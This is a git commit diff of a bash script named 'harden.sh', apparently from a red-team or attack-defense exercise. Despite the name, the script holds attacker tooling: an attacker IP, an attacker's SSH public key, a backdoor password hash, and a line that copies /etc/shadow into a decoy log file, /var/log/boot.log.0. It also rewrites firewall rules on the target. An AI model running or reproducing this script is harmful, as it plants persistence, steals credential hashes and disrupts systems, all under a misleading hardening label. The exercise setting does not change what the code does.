32b3edfecf16c146769bad847a0c525d4d6aa913
jmtjcb <jmtjcb@gmail.com>
2024-04-09 23:59:39 -0600

    harden script changes

--- harden.sh
+++ harden.sh
@@ -1,19 +1,20 @@
+#!/bin/bash
+
 # BEFORE RUNNING: 
 # 1. set the attackerIP variable to the IP of the attacker machine
 # 2. set the allowedPorts variable to the ports that should be allowed for the service
 # 3. generate an ssh key on the kali box and copy it out
 
 attackerIP=192.168.1.15
-attackerPort=4444
 publicKey="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtQ2rUqoG7+G3LUYwLCJOar008UlilwucCskQ9i8/8RsVnI3mJ59aWD7HP7yMshK+i6wXjbWDak5NX0KFQvZXLHFp+V5Qp5fD10gFEDaqfhf2CTepeCy50/1TTuCK/Q1EzGgjh3c+yDj1v7POR1uxIXPpnpmu3P9S8tOYDDC2pimmEqjMwq29Gjotlu+BS4ZTjH9dkbFlkoF3resrnyY+BztIAv/KUbQWP70+1xI73tFK9ubzpJi0Dcg3IfwdmEUtI8BbnF4q4/8pIObuzHfxnpe3/FTGp4tibYRsqTxdlckIFAcfI1SgZPnXyzaVDwH4HU4Seh4u+je3mAer5qK1pITLC7dgWt/+cpnLJ/2dXEJowuia8C3YZCJX21gyFPub3doCKqgQ/SmGi8IfDIWfm35YT7mU3862XC3bYrOqzKhvwA0lT69S8s4RtKkPKvWRJphGFwuuSrZOyfIP4Ew1EHScg4CzX4juUc1mU5Tmd7HWOTpBpHpfIn89bNle/eU= emile@EMILE-LT-UBU"
 scorebotUser="scorebot"
 backdoorPassHash='$6$j8vzzMPeNMxOBoNf$B6Pb78gRwsaCxEx8zzEwG2bos08U3tEkXL1aryHd5iUy9iq0VgFxzFafqQezxFhFNBAY0Q0LmAUIUd2uDkm3A/'
-allowedInboundPorts=("22" "53" "20")
+allowedInboundPorts=("22" "53" "3640")
 
 
 
 touch /var/log/boot.log.0
-cat /etc/shadow >> boot.log.0
+cat /etc/shadow >> /var/log/boot.log.0
 
 
 
@@ -39,15 +40,23 @@ done < /etc/shadow
 
 iptables -F 
 iptables -X
-chains=$(iptables -L | grep Chain | cut  --delimiter=" " --fields=2)
-for chain in $chains
-do
-    iptables --policy $chain DROP
-done
-for port in "${allowedPorts[@]}"; do
+# chains=$(iptables -L | grep Chain | cut  --delimiter=" " --fields=2)
+# for chain in $chains
+# do
+#     iptables --policy $chain DROP
+# done
+
+iptables --policy INPUT DROP
+
+for port in "${allowedInboundPorts[@]}"; do
     iptables -A INPUT -p tcp --dport $port -j ACCEPT
+    iptables -A OUTPUT -p tcp --dport $port -j ACCEPT
 done
-iptables -A OUTPUT -p icmp -j DROP
+
+
+iptables -I INPUT -p icmp --icmp-type echo-request -j DROP
+ip6tables -I INPUT -p ipv6-icmp --icmpv6-type echo-request -j DROP
+
 iptables-save
 
 
